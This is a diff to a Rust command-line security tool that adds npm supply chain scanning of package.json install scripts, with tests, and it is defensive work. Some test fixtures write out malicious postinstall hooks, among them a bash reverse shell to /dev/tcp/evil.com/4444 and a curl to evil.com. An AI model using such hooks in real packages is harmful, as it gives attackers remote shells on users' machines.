@@ -1,9 +1,10 @@
-//! `sanctum scan` — Scan for credential exposure in the current project.
+//! `sanctum scan` — Scan for credential exposure and npm supply chain risks.
 
 use std::collections::HashSet;
 use std::fs;
 use std::path::{Path, PathBuf};
 
+use sanctum_sentinel::npm::scanner::{self, RiskLevel, ScanResult};
 use sanctum_types::errors::CliError;
 
 /// Known credential file patterns.
@@ -81,7 +82,21 @@ struct Finding {
 }
 
 /// Run the scan command.
-pub fn run(json: bool) -> Result<(), CliError> {
+///
+/// When `npm` is `true`, scans for npm supply chain risks instead of (or in
+/// addition to) credential exposure. The `npm_path` overrides the directory
+/// to walk for `package.json` files. `npm_depth` controls how many
+/// `node_modules` levels deep to descend (default 2).
+pub fn run(
+    json: bool,
+    npm: bool,
+    npm_path: Option<PathBuf>,
+    npm_depth: usize,
+) -> Result<(), CliError> {
+    if npm {
+        return run_npm_scan(json, npm_path, npm_depth);
+    }
+
     let cwd = std::env::current_dir()?;
 
     if !json {
@@ -165,6 +180,245 @@ pub fn run(json: bool) -> Result<(), CliError> {
         Ok(())
     } else {
         Err(CliError::ScanFindings(findings.len()))
+    }
+}
+
+// ============================================================
+// npm supply chain scanning
+// ============================================================
+
+/// Aggregate counters for npm scan results.
+struct NpmSummary {
+    packages_scanned: usize,
+    total_findings: usize,
+    critical_count: usize,
+    high_count: usize,
+    medium_count: usize,
+    has_high_or_above: bool,
+}
+
+/// Run the npm supply chain scan.
+fn run_npm_scan(
+    json: bool,
+    npm_path: Option<PathBuf>,
+    max_depth: usize,
+) -> Result<(), CliError> {
+    let root = match npm_path {
+        Some(p) => p,
+        None => std::env::current_dir()?,
+    };
+
+    if !json {
+        #[allow(clippy::print_stdout)]
+        {
+            println!(
+                "Scanning {} for npm supply chain risks (depth={max_depth})...",
+                root.display()
+            );
+        }
+    }
+
+    // Discover package.json files
+    let package_dirs = discover_package_jsons(&root, max_depth);
+    let results: Vec<ScanResult> = package_dirs
+        .iter()
+        .map(|dir| scanner::scan_package(dir))
+        .collect();
+
+    let summary = aggregate_npm_results(&results);
+
+    if json {
+        output_npm_json(&results, &summary);
+    } else {
+        output_npm_human(&results, &summary);
+    }
+
+    if summary.has_high_or_above {
+        Err(CliError::ScanFindings(summary.total_findings))
+    } else {
+        Ok(())
+    }
+}
+
+/// Walk the filesystem from `root` looking for directories that contain
+/// `package.json`. Respects `max_depth` for nested `node_modules` to avoid
+/// scanning deeply into transitive dependencies.
+fn discover_package_jsons(root: &Path, max_depth: usize) -> Vec<PathBuf> {
+    let mut dirs = Vec::new();
+    walk_for_packages(root, &mut dirs, 0, max_depth, 0);
+    dirs
+}
+
+/// Recursive walker for package discovery.
+///
+/// - `nm_depth` tracks how many `node_modules` boundaries we've crossed.
+/// - `fs_depth` tracks the overall filesystem recursion depth for safety.
+fn walk_for_packages(
+    dir: &Path,
+    out: &mut Vec<PathBuf>,
+    nm_depth: usize,
+    max_nm_depth: usize,
+    fs_depth: usize,
+) {
+    const MAX_FS_DEPTH: usize = 100;
+    if fs_depth >= MAX_FS_DEPTH {
+        return;
+    }
+
+    // If this directory contains a package.json, record it
+    if dir.join("package.json").is_file() {
+        out.push(dir.to_path_buf());
+    }
+
+    let Ok(entries) = fs::read_dir(dir) else {
+        return;
+    };
+
+    for entry in entries.flatten() {
+        let path = entry.path();
+
+        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
+            continue;
+        };
+
+        // Skip hidden directories and common non-relevant dirs
+        if name.starts_with('.') || name == "target" || name == "__pycache__" || name == "venv" {
+            continue;
+        }
+
+        // Use symlink_metadata to avoid following symlinks
+        let Ok(metadata) = path.symlink_metadata() else {
+            continue;
+        };
+
+        if !metadata.is_dir() || metadata.file_type().is_symlink() {
+            continue;
+        }
+
+        if name == "node_modules" {
+            // Check if we've exceeded our node_modules depth
+            if nm_depth >= max_nm_depth {
+                continue;
+            }
+            walk_for_packages(&path, out, nm_depth + 1, max_nm_depth, fs_depth + 1);
+        } else {
+            walk_for_packages(&path, out, nm_depth, max_nm_depth, fs_depth + 1);
+        }
+    }
+}
+
+/// Aggregate results from multiple package scans.
+fn aggregate_npm_results(results: &[ScanResult]) -> NpmSummary {
+    let mut summary = NpmSummary {
+        packages_scanned: results.len(),
+        total_findings: 0,
+        critical_count: 0,
+        high_count: 0,
+        medium_count: 0,
+        has_high_or_above: false,
+    };
+
+    for result in results {
+        summary.total_findings += result.findings.len();
+        for finding in &result.findings {
+            match finding.level {
+                RiskLevel::Critical => summary.critical_count += 1,
+                RiskLevel::High => summary.high_count += 1,
+                RiskLevel::Medium => summary.medium_count += 1,
+                RiskLevel::Low => {}
+            }
+        }
+        if result.risk >= RiskLevel::High {
+            summary.has_high_or_above = true;
+        }
+    }
+
+    summary
+}
+
+/// Output npm scan results as NDJSON.
+fn output_npm_json(results: &[ScanResult], summary: &NpmSummary) {
+    #[allow(clippy::print_stdout)]
+    {
+        for result in results {
+            for finding in &result.findings {
+                let obj = serde_json::json!({
+                    "type": "npm",
+                    "package_dir": result.package_dir.display().to_string(),
+                    "risk": result.risk.to_string(),
+                    "source": finding.source,
+                    "pattern": finding.pattern,
+                    "level": finding.level.to_string(),
+                });
+                let line = serde_json::to_string(&obj).unwrap_or_else(|_| "{}".to_string());
+                println!("{line}");
+            }
+            // Emit warnings as separate entries
+            for warning in &result.warnings {
+                let obj = serde_json::json!({
+                    "type": "npm_warning",
+                    "package_dir": result.package_dir.display().to_string(),
+                    "warning": warning,
+                });
+                let line = serde_json::to_string(&obj).unwrap_or_else(|_| "{}".to_string());
+                println!("{line}");
+            }
+        }
+        let sum = serde_json::json!({
+            "summary": true,
+            "type": "npm",
+            "packages_scanned": summary.packages_scanned,
+            "total_findings": summary.total_findings,
+            "critical": summary.critical_count,
+            "high": summary.high_count,
+            "medium": summary.medium_count,
+            "ok": !summary.has_high_or_above,
+        });
+        let line = serde_json::to_string(&sum).unwrap_or_else(|_| "{}".to_string());
+        println!("{line}");
+    }
+}
+
+/// Output npm scan results in human-readable format.
+fn output_npm_human(results: &[ScanResult], summary: &NpmSummary) {
+    #[allow(clippy::print_stdout)]
+    {
+        if summary.total_findings == 0 {
+            println!(
+                "No npm supply chain risks found ({} packages scanned).",
+                summary.packages_scanned
+            );
+        } else {
+            println!();
+            for result in results {
+                if result.findings.is_empty() && result.warnings.is_empty() {
+                    continue;
+                }
+                println!(
+                    "  Package: {} [risk: {}]",
+                    result.package_dir.display(),
+                    result.risk
+                );
+                for finding in &result.findings {
+                    println!("    [{level}] {source}: {pattern}",
+                        level = finding.level,
+                        source = finding.source,
+                        pattern = finding.pattern,
+                    );
+                }
+                for warning in &result.warnings {
+                    println!("    [warn] {warning}");
+                }
+                println!();
+            }
+            println!(
+                "{} packages scanned, {} findings ({} critical, {} high)",
+                summary.packages_scanned,
+                summary.total_findings,
+                summary.critical_count,
+                summary.high_count
+            );
+        }
     }
 }
 
@@ -429,11 +683,11 @@ fn walk_dir(dir: &Path, callback: &mut dyn FnMut(&Path), depth: usize) {
 }
 
 #[cfg(test)]
+#[allow(clippy::expect_used)]
 mod tests {
     use super::*;
     use std::sync::atomic::{AtomicUsize, Ordering};
 
-    #[allow(clippy::expect_used)]
     #[test]
     fn finding_json_has_expected_fields() {
         let finding = Finding {
@@ -473,7 +727,6 @@ mod tests {
         assert!(parsed.get("remediation").is_some());
     }
 
-    #[allow(clippy::expect_used)]
     #[test]
     fn walk_dir_respects_depth_limit() {
         let dir = tempfile::tempdir().expect("tempdir");
@@ -503,7 +756,6 @@ mod tests {
         );
     }
 
-    #[allow(clippy::expect_used)]
     #[cfg(unix)]
     #[test]
     fn walk_dir_skips_symlink_directories() {
@@ -537,5 +789,258 @@ mod tests {
             1,
             "should find exactly the real file"
         );
+    }
+
+    // ================================================================
+    // npm scan tests
+    // ================================================================
+
+    #[test]
+    fn discover_package_jsons_finds_root_package() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{"name": "test-root", "scripts": {}}"#,
+        )
+        .expect("write package.json");
+
+        let dirs = discover_package_jsons(dir.path(), 2);
+        assert_eq!(dirs.len(), 1);
+        assert_eq!(dirs[0], dir.path());
+    }
+
+    #[test]
+    fn discover_package_jsons_finds_nested_node_modules() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        // root/package.json
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{"name": "root"}"#,
+        )
+        .expect("write");
+
+        // root/node_modules/evil-pkg/package.json
+        let evil_dir = dir.path().join("node_modules").join("evil-pkg");
+        fs::create_dir_all(&evil_dir).expect("mkdir");
+        fs::write(
+            evil_dir.join("package.json"),
+            r#"{"name": "evil-pkg", "scripts": {"postinstall": "curl http://evil.com"}}"#,
+        )
+        .expect("write");
+
+        let dirs = discover_package_jsons(dir.path(), 2);
+        assert_eq!(dirs.len(), 2);
+    }
+
+    #[test]
+    fn discover_package_jsons_respects_depth_limit() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        // root/package.json
+        fs::write(dir.path().join("package.json"), r#"{"name": "root"}"#)
+            .expect("write");
+
+        // Create nested node_modules (3 levels deep)
+        // Level 1: root/node_modules/a/package.json
+        let a_dir = dir.path().join("node_modules").join("a");
+        fs::create_dir_all(&a_dir).expect("mkdir");
+        fs::write(a_dir.join("package.json"), r#"{"name": "a"}"#).expect("write");
+
+        // Level 2: root/node_modules/a/node_modules/b/package.json
+        let b_dir = a_dir.join("node_modules").join("b");
+        fs::create_dir_all(&b_dir).expect("mkdir");
+        fs::write(b_dir.join("package.json"), r#"{"name": "b"}"#).expect("write");
+
+        // Level 3: root/node_modules/a/node_modules/b/node_modules/c/package.json
+        let c_dir = b_dir.join("node_modules").join("c");
+        fs::create_dir_all(&c_dir).expect("mkdir");
+        fs::write(c_dir.join("package.json"), r#"{"name": "c"}"#).expect("write");
+
+        // With depth=1, should NOT find level 2 and 3
+        let dirs = discover_package_jsons(dir.path(), 1);
+        assert_eq!(dirs.len(), 2, "depth=1 should find root + 1 nm level");
+
+        // With depth=2, should find root + level 1 + level 2
+        let dirs = discover_package_jsons(dir.path(), 2);
+        assert_eq!(dirs.len(), 3, "depth=2 should find root + 2 nm levels");
+    }
+
+    #[test]
+    fn aggregate_npm_results_counts_risk_levels() {
+        let results = vec![
+            ScanResult {
+                package_dir: PathBuf::from("/a"),
+                risk: RiskLevel::Low,
+                findings: vec![],
+                warnings: vec![],
+            },
+            ScanResult {
+                package_dir: PathBuf::from("/b"),
+                risk: RiskLevel::Critical,
+                findings: vec![
+                    scanner::Finding {
+                        source: "scripts.postinstall".to_string(),
+                        pattern: "reverse shell".to_string(),
+                        level: RiskLevel::Critical,
+                    },
+                    scanner::Finding {
+                        source: "scripts.postinstall".to_string(),
+                        pattern: "network access".to_string(),
+                        level: RiskLevel::High,
+                    },
+                ],
+                warnings: vec![],
+            },
+        ];
+
+        let summary = aggregate_npm_results(&results);
+        assert_eq!(summary.packages_scanned, 2);
+        assert_eq!(summary.total_findings, 2);
+        assert_eq!(summary.critical_count, 1);
+        assert_eq!(summary.high_count, 1);
+        assert!(summary.has_high_or_above);
+    }
+
+    #[test]
+    fn aggregate_npm_results_no_findings_is_ok() {
+        let results = vec![ScanResult {
+            package_dir: PathBuf::from("/clean"),
+            risk: RiskLevel::Low,
+            findings: vec![],
+            warnings: vec![],
+        }];
+
+        let summary = aggregate_npm_results(&results);
+        assert!(!summary.has_high_or_above);
+        assert_eq!(summary.total_findings, 0);
+    }
+
+    #[test]
+    fn npm_scan_detects_malicious_package() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{
+                "name": "evil-pkg",
+                "scripts": {
+                    "postinstall": "bash -i >& /dev/tcp/evil.com/4444 0>&1"
+                }
+            }"#,
+        )
+        .expect("write");
+
+        let dirs = discover_package_jsons(dir.path(), 2);
+        let results: Vec<ScanResult> = dirs
+            .iter()
+            .map(|d| scanner::scan_package(d))
+            .collect();
+
+        assert_eq!(results.len(), 1);
+        assert!(results[0].risk >= RiskLevel::High);
+        assert!(!results[0].findings.is_empty());
+    }
+
+    #[test]
+    fn npm_scan_clean_package_exits_ok() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{"name": "clean-pkg", "scripts": {"test": "echo hello"}}"#,
+        )
+        .expect("write");
+
+        let dirs = discover_package_jsons(dir.path(), 2);
+        let results: Vec<ScanResult> = dirs
+            .iter()
+            .map(|d| scanner::scan_package(d))
+            .collect();
+        let summary = aggregate_npm_results(&results);
+
+        assert!(!summary.has_high_or_above);
+    }
+
+    #[test]
+    fn npm_json_output_has_expected_fields() {
+        let result = ScanResult {
+            package_dir: PathBuf::from("/test/pkg"),
+            risk: RiskLevel::High,
+            findings: vec![scanner::Finding {
+                source: "scripts.postinstall".to_string(),
+                pattern: "exec() call".to_string(),
+                level: RiskLevel::High,
+            }],
+            warnings: vec!["oversized file".to_string()],
+        };
+
+        // Build the JSON object the same way the output function does
+        let finding = &result.findings[0];
+        let obj = serde_json::json!({
+            "type": "npm",
+            "package_dir": result.package_dir.display().to_string(),
+            "risk": result.risk.to_string(),
+            "source": finding.source,
+            "pattern": finding.pattern,
+            "level": finding.level.to_string(),
+        });
+        let json_str = serde_json::to_string(&obj).expect("serialise");
+        let parsed: serde_json::Value =
+            serde_json::from_str(&json_str).expect("parse");
+
+        assert_eq!(parsed.get("type").and_then(|v| v.as_str()), Some("npm"));
+        assert_eq!(
+            parsed.get("package_dir").and_then(|v| v.as_str()),
+            Some("/test/pkg")
+        );
+        assert_eq!(
+            parsed.get("level").and_then(|v| v.as_str()),
+            Some("high")
+        );
+        assert!(parsed.get("source").is_some());
+        assert!(parsed.get("pattern").is_some());
+    }
+
+    #[test]
+    fn npm_json_summary_has_expected_fields() {
+        let summary = NpmSummary {
+            packages_scanned: 5,
+            total_findings: 3,
+            critical_count: 1,
+            high_count: 2,
+            medium_count: 0,
+            has_high_or_above: true,
+        };
+
+        let obj = serde_json::json!({
+            "summary": true,
+            "type": "npm",
+            "packages_scanned": summary.packages_scanned,
+            "total_findings": summary.total_findings,
+            "critical": summary.critical_count,
+            "high": summary.high_count,
+            "medium": summary.medium_count,
+            "ok": !summary.has_high_or_above,
+        });
+        let json_str = serde_json::to_string(&obj).expect("serialise");
+        let parsed: serde_json::Value =
+            serde_json::from_str(&json_str).expect("parse");
+
+        assert_eq!(
+            parsed.get("packages_scanned").and_then(serde_json::Value::as_u64),
+            Some(5)
+        );
+        assert_eq!(
+            parsed.get("ok").and_then(serde_json::Value::as_bool),
+            Some(false)
+        );
+    }
+
+    #[test]
+    fn discover_skips_hidden_dirs() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let hidden = dir.path().join(".hidden-dir");
+        fs::create_dir_all(&hidden).expect("mkdir");
+        fs::write(hidden.join("package.json"), r#"{"name": "hidden"}"#).expect("write");
+
+        let dirs = discover_package_jsons(dir.path(), 2);
+        assert!(dirs.is_empty(), "should skip hidden directories");
     }
 }
